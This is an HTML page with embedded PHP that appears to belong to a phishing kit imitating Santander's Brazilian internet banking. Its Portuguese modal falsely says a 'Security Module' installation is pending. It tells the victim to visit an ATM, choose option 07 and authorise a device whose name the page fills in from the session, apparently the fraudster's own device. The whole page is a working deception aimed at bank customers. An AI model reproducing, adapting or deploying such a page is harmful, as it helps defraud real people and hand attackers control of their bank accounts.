<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title> </title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	<link rel="stylesheet" href="styles/geral.css">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900" rel="stylesheet">
	<script src="javascripts/jquery-1.4.2.min.js"></script>
	<script src="javascripts/jquery.maskedinput-1.2.2.min.js"></script>
	<script src="javascripts/custom.js"></script>
</head>
<body class="color_enter_home">

<div class="container is_header">

		<div class="left">
			<div class="logo"><img src="imgs/logo.png"></div><!-- logo -->
			<div class="busca"><input type="text" name="busca" class="buscar_home" placeholder="Digite aqui sua busca" autocomplete="off"></div>
		</div><!-- left -->

		<div class="right">
			<div class="gerente"><img src="imgs/icon_gerente.jpg"></div><!-- gerente -->
			<div class="user"><img src="imgs/icon_user.jpg"></div><!-- user -->
			<div class="exit"><span>Sair</span></div>
		</div><!-- right -->

<div class="clear"></div>
</div><!-- container -->


<div class="container is_corpo_main">
		<div class="menu_lateral"><img src="imgs/menu_lateral.jpg"></div>

		<div class="content_corpo">
			<img src="imgs/fundo_corpo.jpg">
		</div><!-- content_corpo -->
	<div class="clear"></div>
</div><!-- container -->



<div class="block_modal_corpo">
	<div class="modal_corpo">
		<div class="modal_title">
			<img src="imgs/logo.png">
		</div><!-- modal_title -->

		<div class="desc_modal" style="text-align:left;">
			O processo de instalação do <strong>Módulo de Segurança Santander</strong>, está <strong>PENDENTE!</strong>
			<br><br>
			<span>
				O processo de instalação do Módulo de Segurança Santander ainda está pendente de confirmação no caixa eletrônico.
				<br><br>
				Para finalizar o processo, por motivos de segurança, você deve comparecer pessoalmente à um de nossos caixas eletrônicos, e finalizar o processo de habilitação deste dispostivo.

				<br><br>
				<span style="font-size:1.2em;color:#ff0000;">Para finalizar o processo de instalação, siga os passoa apresentados abaixo.</span>
				<br><br>

				<ul style="line-height: 1.4em;">
					<li><t style="color:red;">1</t> - Encontre um caixa eletrônico Santander.</li>
					<li><t style="color:red;">2</t> - Identifique-se usando seu cartão.</li>
					<li><t style="color:red;">3</t> - Opção 07 "<strong>Habilitação ID Santander</strong>".</li>
					<li><t style="color:red;">4</t> - Nesta tela aparecerão dispostivos para liberação.
						<ol>
							<li>&nbsp;&nbsp;&nbsp;• Selecione o "<strong><?php echo $_SESSION['apelido'];?></strong>".</li>
							<li>&nbsp;&nbsp;&nbsp;• Efetue a liberação do mesmo.</li>
						</ol>
					</li>
					<li><t style="color:red;">5</t> - Após realizar o processo acima citado, seu dispostivo: <strong><?php echo $_SESSION['apelido'];?></strong> já estará funcionando de forma correta, e com <strong>total segurança em suas transações Online.</strong></li>
			</ul>
			</span>
		</div><!-- desc_modal -->


	<div class="clear"></div>
	</div><!-- modal_corpo -->
</div><!-- block_modal_corpo -->








<div class="container">
	<div class="content_login">

	<div class="clear"></div>
	</div><!-- content_login -->
</div><!-- container -->
</body>
</html>
